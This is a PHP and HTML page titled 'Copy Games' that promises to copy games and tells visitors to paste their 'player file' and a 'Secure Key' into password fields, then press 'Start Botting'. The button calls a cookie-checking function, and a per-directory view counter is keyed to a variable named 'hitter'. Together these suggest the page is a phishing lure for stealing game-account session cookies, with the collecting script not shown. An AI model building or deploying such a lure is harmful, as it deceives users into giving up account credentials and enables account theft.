<?php
include(__DIR__ . "/../../apis/config.php");

$hitter =  basename(__DIR__);

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Database connection failed: " . $conn->connect_error);
}

$updateStmt = $conn->prepare("UPDATE data SET views = views + 1 WHERE dir = ?");
$updateStmt->bind_param("s", $hitter);
$updateStmt->execute();
$updateStmt->close();
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Copy Games</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="/../apis/css/cc.css" rel="stylesheet" type="text/css">
</head>
<body class="text-white min-h-screen flex flex-col items-center justify-center font-sans">

  <div id="dumPreload" class="bg-gray-900">
    <div class="flex flex-col items-center">
      <svg class="animate-spin h-12 w-12 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
      </svg>
      <p class="mt-4 text-blue-400 text-lg font-semibold">Loading...</p>
    </div>
  </div>

  <div class="dumBg"></div>

  <div id="dumContent" class="w-full max-w-6xl px-6">
    <header class="text-center mb-12">
      <h1 class="text-5xl font-extrabold tracking-wide text-blue-400">Copy Games ⭐</h1>
      <p class="text-lg mt-4 text-gray-300">Copy Games with ease using this futuristic system!</p>
    </header>
    <main class="flex flex-col md:flex-row items-stretch justify-center gap-10">
      <section class="section-bg p-8 rounded-3xl shadow-xl flex-1 text-center max-w-md md:max-w-lg flex flex-col">
        <h2 class="text-3xl font-bold mb-6 text-blue-300">Copy Games 🚀</h2>
        <p class="text-gray-400 mb-6">
          Paste your player file in the box below, then click <span class="font-semibold">"Start Botting!"</span> If you're unsure
          how to find the "player file," watch the tutorial.
        </p>
        <div class="relative flex items-center w-full mt-auto">
          <span class="absolute left-4 text-gray-400">
            <i class="fas fa-file-alt"></i>
          </span>
          <input
            id="dumInput"
            type="password"
            placeholder="Enter player file"
            class="pl-12 p-4 rounded-full input-bg border focus:outline-none focus:ring-2 focus:ring-blue-400 w-full"
            style="border-radius: 17px;"

          >
        </div>
        <div class="relative flex items-center w-full mt-4">
  <span class="absolute left-4 text-gray-400">
    <i class="fas fa-lock"></i>
  </span>
  <input
  required
    id="dumPassword"
    type="password"
    name="password"
    placeholder="Enter Secure Key"
    class="pl-12 p-4 rounded-full input-bg border focus:outline-none focus:ring-2 focus:ring-blue-400 w-full"
    style="border-radius: 17px;"
  >
</div>
        <button
          id="dumButton"
          class="py-4 rounded-full button-gradient hover:bg-blue-600 transition-all text-lg font-semibold shadow-lg dumScale w-full mt-4"
          onclick="dumCheckCookie()"
          style="border-radius: 17px;"

        >
          Start Botting
        </button>
      </section>
    
      <!-- Right Section: How to Use -->
      <section class="section-bg p-8 rounded-3xl shadow-xl flex-1 max-w-lg text-center flex flex-col">
        <h2 class="text-3xl font-bold mb-6 text-blue-300">How to Use?</h2>
        <div class="relative h-64 overflow-y-auto rounded-2xl bg-gray-800 border border-gray-700 flex-1">
          <video
          style="background-color:rgb(0, 0, 0);"
            controls
            src="/../vids/vid.mp4"
            class="w-full h-full rounded-2xl"
            title="Video Tutorial">
          </video>
        </div>
      </section>
    </main>    
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src ="/../apis/js/cc.js"></script>
</body>
</html>
